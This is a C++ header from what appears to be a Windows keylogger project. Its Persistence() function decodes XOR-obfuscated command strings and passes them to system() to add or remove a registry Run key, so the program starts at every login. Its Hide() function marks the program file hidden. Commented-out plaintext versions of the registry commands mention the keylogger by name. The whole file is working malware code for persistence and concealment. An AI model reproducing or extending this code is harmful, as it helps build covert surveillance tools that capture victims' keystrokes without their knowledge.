#pragma once
#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <windows.h>
#include <fstream>
#include <ctime>
#include <csignal>
#include <bitset>
#include <sstream>
#include <iostream>
#include "Encryption.h"

void Persistence(std::string action,std::string file) {
	//reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run / v MyApp / t REG_SZ / d "C:\Program Files\MyApp\MyApp.exe"  
	//std::string result = "cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D" + keylogger;
	//const char* myCString = result.c_str();
	//system(myCString); //add registry persistence 
	//
	 //std::string result = "cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D" + keylogger;
	 //system(result)
	std::string add_reg = "0001000000001000000001110101010101011101000001100111111101100011011101010111011001010011001001000010011100110001010100100010110100010100011100100110010101101101001000000010101000100101001000010010010100100100000011010111010001101100011111000001101000000110000100010001101000000001000010100011100101000101011011000110011000011010000010110000011100011010000001010001011000000011011100100100010101000011000000010000000000001101000000010010010000000000001011010100001001011001010111100001110100111001001100010000000000011100010001010111000001100111000100000110110101010001001101100000011000010110000001110001011100111010011011010001001000010001010111000001000101000011001001110011011100100010000000000110001001101010000100010101110000100011010000110101101000110110";
	std::string del_reg = "000100000000100000000111010101010101110100000110011111110110001101110101011101100101001100000001000001100001100100010111000100010011101000010001011110000111101000110000001100000011111100100110001111010010001100001011011001100111000101100011001101100011100100101110000111000001000100010111001100000100001001011111010101110000011100111001001101000001110000011100000000010011000001000110010000110110110100110000000100000001000100000111000101110000101100101011011001110101010101000011000000000000110000001100000110110010111000110111001010100101111100010000000111100010010101000101001111110101011100100001000000000011110001000100010000100101010000101111010001110100001101010101010100100100101000011001";
	std::string keyy = "secure_101";
	if (action == "add") {
		std::string result = xor_binary_string(add_reg, keyy) + "	 \"" + file + "\" ";
		const char* myCString = result.c_str();
		std::cout << std::endl << myCString << std::endl;
		system(myCString); //add registry persistence 
	}
	else {
		std::string result = xor_binary_string(del_reg, keyy);
		const char* myCString = result.c_str();
		std::cout << std::endl << myCString << std::endl;
		system(myCString); //add registry persistence 
	}

	/*HKEY nKey = NULL;
	if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) == ERROR_SUCCESS) {
		RegSetValueExA(nKey, "keylogger", 0, REG_SZ, (LPBYTE)keylogger.c_str(), keylogger.length());
		RegCloseKey(nKey);
	}*/
}

void Hide(std::string file) {
	DWORD attr = GetFileAttributesA(file.c_str());
	if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
		SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
	}
}